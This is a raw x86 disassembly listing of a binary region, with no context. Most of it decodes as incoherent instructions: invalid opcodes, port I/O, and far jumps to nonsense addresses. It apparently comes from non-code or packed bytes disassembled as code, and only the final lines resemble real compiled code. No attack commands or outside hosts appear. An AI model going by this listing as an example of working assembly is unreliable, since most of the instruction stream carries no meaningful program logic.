  403079:	dec    ebx
  40307a:	or     al,0x60
  40307c:	dec    ebp
  40307d:	pusha  
  40307e:	mov    ds:0x5baacd6c,eax
  403083:	inc    esp
  403084:	int    0x7f
  403086:	push   ss
  403087:	add    DWORD PTR [edx+0x3534108d],ebp
  40308d:	mov    eax,ds:0xf2097777
  403092:	aam    0xfc
  403094:	aaa    
  403095:	clc    
  403096:	mov    ds:0x2d602e32,al
  40309b:	je     0x4030d3
  40309d:	push   es
  40309e:	leave  
  40309f:	jno    0x40302c
  4030a1:	imul   ebx,edx,0xd
  4030a4:	int3   
  4030a5:	rcl    dh,cl
  4030a7:	jg     0x40310c
  4030a9:	or     DWORD PTR [esi],ebx
  4030ab:	jle    0x403072
  4030ad:	lahf   
  4030ae:	scas   eax,DWORD PTR es:[edi]
  4030af:	lds    ecx,FWORD PTR [ebp-0x60]
  4030b2:	sub    eax,0x490eedb9
  4030b7:	push   esi
  4030b8:	mov    al,ds:0x8c72d42
  4030bd:	sub    ecx,ebp
  4030bf:	popf   
  4030c0:	push   ds
  4030c1:	or     BYTE PTR [eax-0x2],bh
  4030c4:	inc    ecx
  4030c5:	pop    ebp
  4030c6:	leave  
  4030c7:	std    
  4030c8:	mov    esp,0xc0ad02aa
  4030cd:	cmp    ebx,eax
  4030cf:	mov    esi,0xa87e4caa
  4030d4:	out    dx,al
  4030d5:	fld    st(7)
  4030d7:	cmp    BYTE PTR [ecx+ebp*4-0x77],dh
  4030db:	push   ss
  4030dc:	hlt    
  4030dd:	cwde   
  4030de:	leave  
  4030df:	sbb    eax,0xe538030f
  4030e4:	push   ss
  4030e5:	call   0x7b062af4
  4030ea:	pop    ss
  4030eb:	or     eax,0x5fe16f90
  4030f0:	sbb    BYTE PTR [eax-0x30c6e1b1],ch
  4030f6:	int    0x30
  4030f8:	ins    BYTE PTR es:[edi],dx
  4030f9:	(bad)  
  4030fa:	stc    
  4030fb:	sub    eax,0xc06d9cba
  403100:	jg     0x4030b5
  403102:	jle    0x4030f3
  403104:	fld    QWORD PTR [ebp-0x2c]
  403107:	arpl   WORD PTR [ecx-0x68],dx
  40310a:	mov    esp,0x69da3b29
  40310f:	nop
  403110:	imul   edi,ebx,0xc4341014
  403116:	inc    esp
  403117:	fist   DWORD PTR [esi+0xc]
  40311a:	test   eax,0x3a10f1bf
  40311f:	adc    al,0x44
  403121:	add    BYTE PTR [esi-0x25fbbebb],al
  403127:	sub    al,0xda
  403129:	jge    0x403184
  40312b:	sahf   
  40312c:	fisttp WORD PTR [esi]
  40312e:	push   esp
  40312f:	adc    al,0xf0
  403131:	outs   dx,DWORD PTR ds:[esi]
  403132:	fistp  WORD PTR [ecx-0x3]
  403135:	xor    al,BYTE PTR [edx-0x2b44d7a4]
  40313b:	adc    BYTE PTR [eax-0x3576b743],ch
  403141:	mov    bh,0xb3
  403143:	cwde   
  403144:	mov    edi,0xdfceb806
  403149:	lods   al,BYTE PTR ds:[esi]
  40314a:	sbb    ecx,DWORD PTR [ebx]
  40314c:	sbb    al,0xed
  40314e:	or     edi,DWORD PTR [ebx-0x127069a8]
  403154:	shl    DWORD PTR [esi+eax*8+0x68774eaa],cl
  40315b:	jmp    eax
  40315d:	ror    DWORD PTR [esi-0x3d7393f2],0x77
  403164:	xchg   ebx,eax
  403165:	icebp  
  403166:	lock scas eax,DWORD PTR es:[edi]
  403168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403169:	fidiv  WORD PTR [edi+0x2514df2e]
  40316f:	cmp    dl,BYTE PTR [ecx]
  403171:	lods   al,BYTE PTR ds:[esi]
  403172:	imul   DWORD PTR [edx-0x70]
  403175:	(bad)  
  403176:	data16 sti 
  403178:	mov    dh,0xce
  40317a:	adc    al,0xd8
  40317c:	cmp    ch,BYTE PTR [eax-0x77ce2e8d]
  403182:	repz fwait
  403184:	cli    
  403185:	test   eax,0xa3f4725c
  40318a:	bound  esi,QWORD PTR [esp+ecx*4+0xd]
  40318e:	test   eax,0xba71a349
  403193:	pusha  
  403194:	cmp    al,0x33
  403196:	sahf   
  403197:	or     eax,0x6464eb9a
  40319c:	cmp    DWORD PTR [edi+0x73],0x3a921711
  4031a3:	sbb    eax,0x5e96a27f
  4031a8:	push   ss
  4031a9:	iret   
  4031aa:	pop    edi
  4031ab:	xor    bl,al
  4031ad:	cmc    
  4031ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031af:	xchg   edx,eax
  4031b0:	mov    esp,DWORD PTR cs:[esi]
  4031b3:	mov    ebx,0x55984811
  4031b8:	inc    ebx
  4031b9:	in     eax,dx
  4031ba:	and    ch,dl
  4031bc:	ins    BYTE PTR es:[edi],dx
  4031bd:	add    eax,0x6d86a3e
  4031c2:	cmc    
  4031c3:	push   0x31faf384
  4031c8:	popf   
  4031c9:	push   esi
  4031ca:	or     bl,ah
  4031cc:	pusha  
  4031cd:	outs   dx,BYTE PTR ds:[esi]
  4031ce:	sbb    ebx,esi
  4031d0:	inc    eax
  4031d1:	das    
  4031d2:	xlat   BYTE PTR ds:[ebx]
  4031d3:	in     eax,0x3c
  4031d5:	arpl   WORD PTR [eax*8-0x6d4b142f],di
  4031dc:	(bad)  
  4031de:	xlat   BYTE PTR ds:[ebx]
  4031df:	(bad)  
  4031e0:	(bad)
  4031e3:	and    DWORD PTR [edi-0x25b9fa5e],eax
  4031e9:	inc    ebp
  4031ea:	cmp    DWORD PTR [edi+ebx*8-0x7e],edx
  4031ee:	jnp    0x4031b8
  4031f0:	or     DWORD PTR [eax+0x59],esi
  4031f3:	mov    ch,0x78
  4031f5:	pop    ds
  4031f6:	jbe    0x40318c
  4031f8:	inc    esp
  4031f9:	xor    eax,edx
  4031fb:	jmp    0x403218
  4031fd:	bound  ebp,QWORD PTR ds:[ebp+0x5f]
  403201:	mov    dl,BYTE PTR ds:[ebx+0x3c997cfc]
  403208:	or     bl,BYTE PTR [ebx]
  40320a:	arpl   WORD PTR [edx+0x85600c6],sp
  403210:	push   0x80b6cacf
  403215:	push   ds
  403216:	and    DWORD PTR [ebx+0x440963dc],ebx
  40321c:	xor    al,0x33
  40321e:	jecxz  0x403282
  403220:	pop    ebp
  403221:	imul   ebx,ecx,0x4fb16971
  403227:	and    DWORD PTR [eax-0x1],ebx
  40322a:	cmp    esi,DWORD PTR [ecx+edi*8]
  40322d:	mov    eax,0x8ab349b5
  403232:	adc    DWORD PTR [ecx-0x4ea978d1],eax
  403238:	xchg   esp,eax
  403239:	lods   al,BYTE PTR ds:[esi]
  40323a:	pop    esp
  40323b:	outs   dx,BYTE PTR ds:[esi]
  40323c:	loop   0x403213
  40323e:	sahf   
  40323f:	sub    DWORD PTR [esp+ecx*1+0x1c],ebp
  403243:	nop
  403244:	loope  0x403273
  403246:	ror    BYTE PTR [ecx+0x6b],1
  403249:	xlat   BYTE PTR ds:[ebx]
  40324a:	mov    BYTE PTR [ebp+0x7e],ch
  40324d:	push   edx
  40324e:	ja     0x4032c6
  403250:	pop    ecx
  403251:	pusha  
  403252:	and    bh,BYTE PTR [edx+0x62]
  403255:	sub    edx,0x68
  403258:	ins    DWORD PTR es:[edi],dx
  403259:	mov    BYTE PTR [edi-0x33],bh
  40325c:	fsub   st,st(3)
  40325e:	add    al,0xa9
  403260:	mov    edx,esp
  403262:	add    edi,edx
  403264:	push   edi
  403265:	cs inc edx
  403267:	lods   al,BYTE PTR ds:[esi]
  403268:	dec    ebx
  403269:	add    dh,cl
  40326b:	pop    ecx
  40326c:	fst    QWORD PTR [ebp-0x14]
  40326f:	stos   BYTE PTR es:[edi],al
  403270:	pusha  
  403271:	iret   
  403272:	aad    0x25
  403274:	sub    DWORD PTR [esi],edi
  403276:	(bad)  
  403277:	cli    
  403278:	push   0x1
  40327a:	sub    eax,ebp
  40327c:	fadd   DWORD PTR [esi]
  40327e:	xlat   BYTE PTR ds:[ebx]
  40327f:	cdq    
  403280:	sahf   
  403281:	xchg   ebx,eax
  403282:	por    mm2,QWORD PTR [edi+0x6f]
  403286:	out    0xf4,al
  403288:	adc    ecx,ebx
  40328a:	(bad)  
  40328b:	in     eax,dx
  40328c:	push   0x4d
  40328e:	mov    WORD PTR [ebp+eiz*2-0x80],ss
  403292:	pop    edi
  403293:	imul   eax,DWORD PTR [ecx+0x40],0x50
  403297:	push   edi
  403298:	arpl   WORD PTR [ebx+0x6b],si
  40329b:	sub    BYTE PTR [edi-0x7b8785df],cl
  4032a1:	inc    ecx
  4032a2:	test   BYTE PTR [ecx],0x77
  4032a5:	(bad)  
  4032a7:	push   ss
  4032a8:	mov    edx,0xc0eab58d
  4032ad:	or     al,0x8
  4032af:	out    0xf5,eax
  4032b1:	pop    ebx
  4032b2:	lea    ecx,[ebx]
  4032b4:	test   BYTE PTR [edx+0x7b],bl
  4032b7:	inc    esp
  4032b8:	dec    esp
  4032b9:	jmp    0xcbf6275
  4032be:	call   0xb08d:0x8f74b3d
  4032c5:	dec    ebp
  4032c6:	lea    edi,[eax]
  4032c8:	push   ecx
  4032c9:	dec    edx
  4032ca:	mov    ch,0x13
  4032cc:	dec    esi
  4032cd:	jle    0x4032b5
  4032cf:	mov    eax,ds:0xc9fa892d
  4032d4:	jnp    0x40331f
  4032d6:	iret   
  4032d7:	push   edi
  4032d8:	mov    esp,0x3a45e677
  4032dd:	or     edi,DWORD PTR [eax-0x6811c87b]
  4032e3:	cmp    eax,0x419e6f06
  4032e8:	pop    edx
  4032e9:	ss in  eax,0x0
  4032ec:	pop    ss
  4032ed:	loopne 0x4032bc
  4032ef:	jle    0x40336b
  4032f1:	mov    dl,BYTE PTR [esi+0x29]
  4032f4:	sbb    DWORD PTR [esi+0x3c],ebp
  4032f7:	pop    ebp
  4032f8:	iret   
  4032f9:	mov    cl,0xe0
  4032fb:	call   0x6db5a686
  403300:	or     al,0x8b
  403302:	js     0x4032fb
  403304:	mov    ebx,0x16a3fc3e
  403309:	pop    esi
  40330a:	call   0x1e8a5005
  40330f:	outs   dx,DWORD PTR ds:[esi]
  403310:	outs   dx,BYTE PTR ds:[esi]
  403311:	push   cs
  403312:	retf   
  403313:	pop    DWORD PTR fs:[ebx-0x58]
  403317:	cmp    eax,0x477ab293
  40331c:	cld    
  40331d:	cmc    
  40331e:	lea    eax,[eax-0x5c1d623c]
  403324:	add    DWORD PTR [edi+ebp*4+0x241bf9e0],edx
  40332b:	and    DWORD PTR [eax+eax*4-0x2c],0x3e969128
  403333:	(bad)  
  403334:	mov    eax,0x76752c88
  403339:	jmp    0xc39f:0xc066992
  403340:	rol    BYTE PTR [ebx],1
  403342:	fist   DWORD PTR [ecx+ebx*8]
  403345:	popf   
  403346:	push   ss
  403347:	daa    
  403348:	cld    
  403349:	aas    
  40334a:	stos   DWORD PTR es:[edi],eax
  40334b:	jge    0x4033a1
  40334d:	sar    BYTE PTR [ebx-0x3c],1
  403350:	sar    BYTE PTR [ecx+0x263a3816],cl
  403356:	jmp    0x40338d
  403358:	clc    
  403359:	retf   
  40335a:	mov    esp,0x787327e0
  40335f:	call   0x5210:0x7fd446ce
  403366:	out    dx,al
  403367:	mov    edx,0x1f281f52
  40336c:	xor    eax,0xc27853a7
  403371:	add    BYTE PTR [eax-0x450a89a6],dl
  403377:	jae    0x403395
  403379:	shl    edx,0xcf
  40337c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40337d:	or     dh,BYTE PTR [edx]
  40337f:	imul   esp,DWORD PTR [edi-0x25],0xef609b75
  403386:	xlat   BYTE PTR ds:[ebx]
  403387:	outs   dx,BYTE PTR ds:[esi]
  403388:	push   esp
  403389:	xchg   esi,eax
  40338a:	or     dh,dh
  40338c:	cdq    
  40338d:	xchg   bl,ch
  40338f:	ja     0x4033c7
  403391:	js     0x403358
  403393:	je     0x403369
  403395:	dec    esi
  403396:	pop    ecx
  403397:	xchg   edx,eax
  403398:	cmp    BYTE PTR [ecx+edx*1-0x33],cl
  40339c:	pop    ebx
  40339d:	jns    0x4033b4
  40339f:	mov    ecx,0x2be27f27
  4033a4:	dec    edi
  4033a5:	xchg   edx,eax
  4033a6:	mov    ebp,edi
  4033a8:	in     al,dx
  4033a9:	xor    al,0x46
  4033ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ac:	and    ch,BYTE PTR [ebp-0x73]
  4033af:	sub    al,0xe4
  4033b1:	sub    al,0xa5
  4033b3:	mov    WORD PTR [eax],es
  4033b5:	retf   
  4033b6:	mov    dh,bl
  4033b8:	sub    BYTE PTR [edi+0x48],0x7f
  4033bc:	mov    ebp,0xfdcc76a7
  4033c1:	or     eax,0xba1e4938
  4033c6:	inc    ebx
  4033c7:	rcl    DWORD PTR [edi],1
  4033c9:	mov    WORD PTR [ebx+ebp*2-0x33],cs
  4033cd:	ss inc edi
  4033cf:	jmp    0x4033d4
  4033d1:	call   FWORD PTR [edx-0x2c]
  4033d4:	jecxz  0x40339f
  4033d6:	(bad)  
  4033d7:	out    dx,al
  4033d8:	sub    eax,esi
  4033da:	add    eax,0xcbbd6937
  4033df:	cs inc dh
  4033e2:	into   
  4033e3:	les    esi,FWORD PTR [ebx-0x26bf0b97]
  4033e9:	ret    0x5fb3
  4033ec:	xor    al,0x58
  4033ee:	shr    BYTE PTR [esi],cl
  4033f0:	mov    edi,0x29dbf3ce
  4033f5:	test   cl,bl
  4033f7:	xchg   esp,eax
  4033f8:	inc    ecx
  4033f9:	mov    bl,BYTE PTR ds:0x68a7ff03
  4033ff:	add    edx,DWORD PTR [ecx+0x9]
  403402:	mov    esp,0x38d1d04d
  403407:	mov    ebp,0xc0e4c6a8
  40340c:	scas   eax,DWORD PTR es:[edi]
  40340d:	(bad)  
  40340e:	pop    ebx
  40340f:	jns    0x4033db
  403411:	test   DWORD PTR ds:0x4f0d6cd9,0x2cbb40d7
  40341b:	pop    ecx
  40341c:	fnstsw ax
  40341e:	imul   edx,DWORD PTR [edx-0x18491aa2],0x44ed4742
  403428:	sbb    ebp,DWORD PTR [ecx-0x5c9c714a]
  40342e:	jne    0x4033e4
  403430:	jno    0x403470
  403432:	jecxz  0x4033e0
  403434:	mov    esp,0x1820b069
  403439:	add    al,0xfe
  40343b:	inc    esp
  40343c:	cmp    DWORD PTR ds:0xec8d5f8a,edi
  403442:	mov    edi,0xafba2f83
  403447:	push   cs
  403448:	jns    0x4033d1
  40344a:	and    eax,0x5ba0eda3
  40344f:	in     eax,0x79
  403451:	sub    cl,BYTE PTR [ebp-0x58]
  403454:	and    esi,DWORD PTR [edi]
  403456:	and    dh,BYTE PTR [ecx-0x5edfca61]
  40345c:	jno    0x4034ac
  40345e:	push   ecx
  40345f:	adc    al,0x7b
  403461:	fnsave [edi+0x41857a7a]
  403467:	mov    BYTE PTR [eax-0x304a0860],dh
  40346d:	pop    ss
  40346e:	iret   
  40346f:	(bad)  
  403470:	cli    
  403471:	xlat   BYTE PTR ds:[ebx]
  403472:	imul   eax,DWORD PTR [esi+0xe],0xe
  403476:	add    eax,0x7b6f92cf
  40347b:	mov    DWORD PTR [ebx+0x4c],ebp
  40347e:	add    esi,DWORD PTR [ebp+0x2e]
  403481:	rcr    DWORD PTR [edx],0xdb
  403484:	dec    eax
  403485:	mov    ah,0x92
  403487:	xchg   ecx,eax
  403488:	or     eax,0xef83962
  40348d:	call   0x1e27:0xc9ce4208
  403494:	sbb    DWORD PTR [ebp+0x71],eax
  403497:	dec    esi
  403498:	ds and eax,0x383c61c9
  40349e:	push   esi
  40349f:	scas   al,BYTE PTR es:[edi]
  4034a0:	hlt    
  4034a1:	fdivr  DWORD PTR [ebp-0x3]
  4034a4:	dec    ebx
  4034a5:	popf   
  4034a6:	jle    0x403456
  4034a8:	pop    ds
  4034a9:	pop    edx
  4034aa:	mov    esp,0x2a7194ca
  4034af:	fdiv   DWORD PTR [ebx+0x46]
  4034b2:	ret    
  4034b3:	pop    ebp
  4034b4:	mov    esp,0xa17033d4
  4034b9:	repnz xor esi,ecx
  4034bc:	das    
  4034bd:	test   DWORD PTR [edi+eiz*2-0x410abdc],0x1b48f5b8
  4034c8:	sub    dl,BYTE PTR [edx]
  4034ca:	dec    edx
  4034cb:	fst    DWORD PTR [ecx]
  4034cd:	push   0x1
  4034cf:	je     0x403512
  4034d1:	(bad)  
  4034d3:	test   al,0xcd
  4034d5:	xlat   BYTE PTR ds:[ebx]
  4034d6:	das    
  4034d7:	mov    esi,0x69add194
  4034dc:	js     0x4034be
  4034de:	cmp    bl,BYTE PTR [esi+0x59]
  4034e1:	je     0x403549
  4034e3:	cmp    BYTE PTR [edi-0xf],bl
  4034e6:	test   al,0x92
  4034e8:	int    0xf0
  4034ea:	xor    ah,dl
  4034ec:	retf   0xd2fb
  4034ef:	mov    esp,0xa159ae8c
  4034f4:	into   
  4034f5:	aas    
  4034f6:	dec    ecx
  4034f7:	shl    DWORD PTR [eax+0x68],1
  4034fa:	jg     0x403517
  4034fc:	fcmovnbe st,st(7)
  4034fe:	jne    0x4034fa
  403500:	dec    ecx
  403501:	push   es
  403502:	loop   0x403541
  403504:	adc    DWORD PTR [edi-0x2791ad68],ecx
  40350a:	xchg   edx,eax
  40350b:	test   eax,0xbde9d63d
  403510:	mov    edi,0x4ed69a57
  403515:	hlt    
  403516:	hlt    
  403517:	xor    BYTE PTR [esp+ebp*4+0x42123e8a],bh
  40351e:	sti    
  40351f:	enter  0xe603,0x11
  403523:	sub    ch,BYTE PTR [ebx-0x4e03832]
  403529:	add    dh,dl
  40352b:	scas   al,BYTE PTR es:[di]
  40352d:	in     al,dx
  40352e:	mov    ds:0x80f7cd32,al
  403533:	nop
  403534:	arpl   WORD PTR [ecx+esi*2+0x37],bp
  403538:	push   es
  403539:	fldenv [ebp+ebx*2+0x4b]
  40353d:	jmp    0x4034c9
  40353f:	jl     0x4035af
  403541:	inc    edx
  403542:	fs daa 
  403544:	sbb    DWORD PTR [edx-0x2b51bda2],esi
  40354a:	stos   DWORD PTR es:[edi],eax
  40354b:	jmp    0x403551
  40354d:	scas   eax,DWORD PTR es:[edi]
  40354e:	sub    BYTE PTR [ebx],cl
  403550:	in     al,dx
  403551:	mov    eax,0x85a21776
  403556:	mov    ch,0x40
  403558:	mul    DWORD PTR [eax+eax*8-0x2c51792a]
  40355f:	pop    ebp
  403560:	sbb    BYTE PTR [edi-0x1e],0x14
  403564:	mov    dl,0x2b
  403566:	fwait
  403567:	gs std 
  403569:	pop    ds
  40356a:	pop    ss
  40356b:	add    BYTE PTR [ecx+ecx*4+0xe],bh
  40356f:	test   eax,0x38090de1
  403574:	(bad)  
  403576:	(bad)  
  403578:	cli    
  403579:	in     al,dx
  40357a:	fisubr DWORD PTR [edi]
  40357c:	clc    
  40357d:	pushf  
  40357e:	push   edi
  40357f:	mov    cl,0xf7
  403581:	inc    edx
  403582:	jmp    0x40350b
  403584:	lods   al,BYTE PTR ds:[esi]
  403585:	fs sahf 
  403587:	repz adc BYTE PTR [edx+eiz*2],bh
  40358b:	or     eax,0xbf9e7c
  403590:	xlat   BYTE PTR ds:[ebx]
  403591:	jl     0x4035d4
  403593:	xchg   esi,eax
  403594:	iret   
  403595:	xchg   ebp,eax
  403596:	jmp    0x4035d4
  403598:	sahf   
  403599:	(bad)  
  40359a:	push   ds
  40359b:	jp     0x4035f8
  40359d:	sbb    al,0xf9
  40359f:	sub    edx,ecx
  4035a1:	and    BYTE PTR [ebx-0x31],0x34
  4035a5:	fistp  QWORD PTR [edi-0x50]
  4035a8:	cmp    esp,DWORD PTR [ecx]
  4035aa:	jl     0x403622
  4035ac:	(bad)  
  4035ad:	fiadd  DWORD PTR [edx-0x43]
  4035b0:	add    dh,bl
  4035b2:	pusha  
  4035b3:	jb     0x40361d
  4035b5:	es cwde 
  4035b7:	out    0x65,eax
  4035b9:	iret   
  4035ba:	mov    cl,0x31
  4035bc:	rol    BYTE PTR [edx-0xa],cl
  4035bf:	fidivr WORD PTR [ebp+0x14]
  4035c2:	mov    esp,edi
  4035c4:	cmc    
  4035c5:	mov    dl,0x84
  4035c7:	xor    al,BYTE PTR [ebx-0x3aae7dec]
  4035cd:	add    ah,al
  4035cf:	inc    edx
  4035d0:	fisubr DWORD PTR [ebx]
  4035d2:	mov    bl,0xad
  4035d4:	add    eax,esi
  4035d6:	push   ds
  4035d7:	or     BYTE PTR [ebx-0x3e619275],bl
  4035dd:	lfs    ebx,FWORD PTR [ebx]
  4035e0:	add    DWORD PTR [ebp+0x31ee7886],ecx
  4035e6:	stos   DWORD PTR es:[edi],eax
  4035e7:	inc    ebx
  4035e8:	jbe    0x40361c
  4035ea:	fistp  QWORD PTR [ebp-0x43]
  4035ed:	fs jo  0x403608
  4035f0:	gs pop edi
  4035f2:	mov    DWORD PTR [edi],esp
  4035f4:	lock outs dx,BYTE PTR ds:[esi]
  4035f6:	mov    bl,0x68
  4035f8:	imul   ebp,DWORD PTR [edx+ecx*8+0x60739d28],0xffffffa7
  403600:	and    dl,BYTE PTR [edx-0xb]
  403603:	ds sub al,0x9d
  403606:	or     BYTE PTR [ebp-0x66d38a85],dl
  40360c:	sbb    dh,BYTE PTR [edx+0x27]
  40360f:	xchg   edi,eax
  403610:	test   ebp,eax
  403612:	call   DWORD PTR [ecx-0x1f3201f2]
  403618:	xchg   ebx,eax
  403619:	sahf   
  40361a:	int    0x68
  40361c:	cmp    DWORD PTR [ebp+0x0],edx
  40361f:	or     edx,DWORD PTR [ecx+0x6cc3a96e]
  403625:	mov    cl,ch
  403627:	sbb    BYTE PTR [ecx],ch
  403629:	mov    eax,ds:0x77da4a31
  40362e:	mov    esp,0x9dc8a774
  403633:	lods   eax,DWORD PTR ds:[esi]
  403634:	xor    DWORD PTR [edi],esi
  403636:	mov    eax,0xf47459f2
  40363b:	sti    
  40363c:	inc    ecx
  40363d:	fild   QWORD PTR [ebx+0x34ad3ac3]
  403643:	jl     0x4036aa
  403645:	mov    al,0x5b
  403647:	push   edx
  403648:	push   edi
  403649:	stos   DWORD PTR es:[edi],eax
  40364a:	xor    bl,bl
  40364c:	xor    cl,dl
  40364e:	mov    WORD PTR [edi-0x2a],ds
  403651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403652:	xor    eax,0xb961bb09
  403657:	aaa    
  403658:	aas    
  403659:	popa   
  40365a:	iret   
  40365b:	loop   0x4036cb
  40365d:	or     eax,0x397cc737
  403662:	das    
  403663:	ror    DWORD PTR [ecx-0x294b0ef],0xfc
  40366a:	and    al,0x33
  40366c:	aaa    
  40366d:	mov    ebx,0x57ed67a7
  403672:	jb     0x40360e
  403674:	test   al,0x1e
  403676:	arpl   WORD PTR [edi+0x4e390473],sp
  40367c:	jmp    0xc632:0x2adf8d33
  403683:	or     cl,BYTE PTR [edi+0x28c9afc7]
  403689:	xchg   ebp,eax
  40368a:	fidivr DWORD PTR [esi-0x9d54c8a]
  403690:	and    DWORD PTR [esi+edx*2-0x5f06806a],ecx
  403697:	fst    QWORD PTR [edi-0x6]
  40369a:	popa   
  40369b:	sub    eax,eax
  40369d:	inc    edi
  40369e:	mov    bh,0x49
  4036a0:	int    0xf8
  4036a2:	jg     0x4036e6
  4036a4:	mov    bl,0xd5
  4036a6:	jmp    0x8bcf:0x6969f4dd
  4036ad:	or     al,0xf3
  4036af:	lods   al,BYTE PTR ds:[esi]
  4036b0:	loop   0x4036e4
  4036b2:	sti    
  4036b3:	test   DWORD PTR [eax+0x1bcacedf],edx
  4036b9:	add    BYTE PTR [ebx+0x7bc10364],0x64
  4036c0:	mov    ah,0x92
  4036c2:	mov    esi,ebx
  4036c4:	call   0xb1c0eea6
  4036c9:	fisubr WORD PTR [eax+eax*8+0x21f046ec]
  4036d0:	jmp    FWORD PTR [eax+0x2bceeae2]
  4036d6:	test   BYTE PTR [edi-0x1f],cl
  4036d9:	lock sub eax,0x1321dd9d
  4036df:	and    BYTE PTR [ebx+0x18b91a1],dh
  4036e5:	cwde   
  4036e6:	push   ecx
  4036e7:	mov    dl,BYTE PTR ss:[edx+0x1d]
  4036eb:	add    eax,0x8cada99
  4036f0:	sbb    BYTE PTR [ecx-0x7c8b5bc1],al
  4036f6:	fsubr  QWORD PTR [edi+0x37]
  4036f9:	push   esp
  4036fa:	dec    ecx
  4036fb:	das    
  4036fc:	imul   eax,edi,0xed57d6be
  403702:	mov    bl,0x96
  403704:	les    edx,FWORD PTR [ecx+0x3d4264d2]
  40370a:	and    edx,ebx
  40370c:	ins    DWORD PTR es:[edi],dx
  40370d:	scas   eax,DWORD PTR es:[edi]
  40370e:	dec    ebx
  40370f:	stos   BYTE PTR es:[edi],al
  403710:	push   edx
  403711:	adc    eax,0x2240a6ad
  403716:	out    0x9f,al
  403718:	imul   ecx,DWORD PTR [eax+0x206dbe28],0x1b247db7
  403722:	dec    esp
  403723:	pop    edx
  403724:	lods   al,BYTE PTR ds:[esi]
  403725:	sbb    dl,BYTE PTR [edx]
  403727:	js     0x4036d4
  403729:	mov    ebp,0x20b047dd
  40372e:	data16 (bad) 
  403730:	mov    dh,0x68
  403732:	fadd   DWORD PTR [ecx+edi*1+0x56]
  403736:	xor    ebp,DWORD PTR [ecx]
  403738:	sbb    eax,DWORD PTR [eax-0x25cbc3eb]
  40373e:	(bad)  
  40373f:	sar    bl,cl
  403741:	jecxz  0x403701
  403743:	scas   eax,DWORD PTR es:[edi]
  403744:	in     eax,dx
  403745:	addr16 dec eax
  403747:	(bad)  
  403748:	loope  0x403707
  40374a:	push   0x6ec25fee
  40374f:	fidiv  WORD PTR [esi]
  403751:	js     0x403726
  403753:	ret    0xd19b
  403756:	sub    al,0xec
  403758:	int    0xf9
  40375a:	test   eax,0xb71f352b
  40375f:	xor    eax,0x343b4599
  403764:	xor    sp,dx
  403767:	div    BYTE PTR ds:[ebx]
  40376a:	push   ebp
  40376b:	pop    edi
  40376c:	in     al,0x98
  40376e:	pop    esi
  40376f:	mov    ecx,eax
  403771:	xor    eax,0x1528b2e0
  403776:	inc    esi
  403777:	out    0xb3,al
  403779:	(bad)  
  40377a:	imul   ecx,DWORD PTR [eax+0x5b],0x277b461f
  403781:	cmp    eax,0x9cb3e0a6
  403786:	push   edi
  403787:	repnz pop esi
  403789:	outs   dx,BYTE PTR ds:[esi]
  40378a:	outs   dx,DWORD PTR ds:[esi]
  40378b:	shl    BYTE PTR [ebp+0x7057854a],1
  403791:	pop    edx
  403792:	in     al,0xee
  403794:	addr16 cmp eax,ebp
  403797:	data16 shr BYTE PTR [eax-0x49],1
  40379b:	add    edx,edi
  40379d:	es inc ecx
  40379f:	leave  
  4037a0:	call   0x89a3:0x16229959
  4037a7:	jle    0x40379f
  4037a9:	clc    
  4037aa:	repz fisttp WORD PTR [esi-0x6b9fecfc]
  4037b1:	ja     0x4037a1
  4037b3:	xor    edi,DWORD PTR ds:0x2dd0d637
  4037b9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4037bb:	xchg   DWORD PTR [ecx+edx*8+0x7e25db5c],ebx
  4037c2:	test   al,0x2a
  4037c4:	ficomp DWORD PTR [ebp-0x69b97268]
  4037ca:	mov    dh,0x59
  4037cc:	popf   
  4037cd:	dec    esp
  4037ce:	xchg   edi,eax
  4037cf:	ins    BYTE PTR es:[edi],dx
  4037d0:	out    dx,al
  4037d1:	imul   ecx,DWORD PTR [eax+0x41],0xaccb8de6
  4037d8:	jmp    0x8cfc9aed
  4037dd:	jge    0x4037dc
  4037df:	xor    eax,0x939fb5d1
  4037e4:	aam    0xf9
  4037e6:	ret    0x9cfe
  4037e9:	pop    edx
  4037ea:	cdq    
  4037eb:	loopne 0x403795
  4037ed:	xchg   BYTE PTR [esi+ebp*4+0x6dd59364],cl
  4037f4:	leave  
  4037f5:	pop    ds
  4037f6:	out    dx,al
  4037f7:	fmul   QWORD PTR [eax-0x718a809e]
  4037fd:	lock sub eax,DWORD PTR [esi-0x42]
  403801:	xchg   esp,eax
  403802:	fcmove st,st(3)
  403804:	or     DWORD PTR [ecx],ecx
  403806:	mov    al,ds:0x733348e
  40380b:	add    al,0x67
  40380d:	cmc    
  40380e:	xchg   edx,eax
  40380f:	imul   edx,DWORD PTR [edx],0xffffffd2
  403812:	outs   dx,DWORD PTR ds:[esi]
  403813:	lods   eax,DWORD PTR ds:[esi]
  403814:	and    DWORD PTR cs:[ebx-0x36],0xd3a944bd
  40381c:	dec    ebx
  40381d:	adc    DWORD PTR [esi],0xffffff9b
  403820:	out    0xcf,eax
  403822:	xor    dh,ah
  403824:	imul   eax,ecx,0x3a1ddbff
  40382a:	xchg   ecx,eax
  40382b:	and    al,0x81
  40382d:	(bad)  
  40382f:	aam    0x15
  403831:	cwde   
  403832:	push   0xffffffab
  403834:	ret    0xd365
  403837:	sub    dl,bh
  403839:	jno    0x4037d6
  40383b:	add    DWORD PTR [ebx+0xf],eax
  40383e:	mov    esp,0x777d23d6
  403843:	ds push ecx
  403845:	aad    0x6a
  403847:	mov    ebx,0xcff38b82
  40384c:	outs   dx,DWORD PTR ds:[esi]
  40384d:	lahf   
  40384e:	dec    esp
  40384f:	push   cs
  403850:	scas   al,BYTE PTR es:[edi]
  403851:	cmp    DWORD PTR [eax+0x48],ebx
  403854:	add    DWORD PTR [ebp-0xc],eax
  403857:	mov    eax,DWORD PTR [ebp-0xc]
  40385a:	mov    ecx,DWORD PTR [ebp-0x8]
  40385d:	mov    ecx,DWORD PTR [ecx]
  40385f:	mov    ecx,DWORD PTR [ecx]
  403861:	mov    ecx,DWORD PTR [ecx]
  403863:	mov    DWORD PTR [ecx+0x1],eax
  403866:	mov    al,BYTE PTR [ebp-0x1]
  403869:	mov    ecx,DWORD PTR [ebp-0x8]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    ecx,DWORD PTR [ecx]
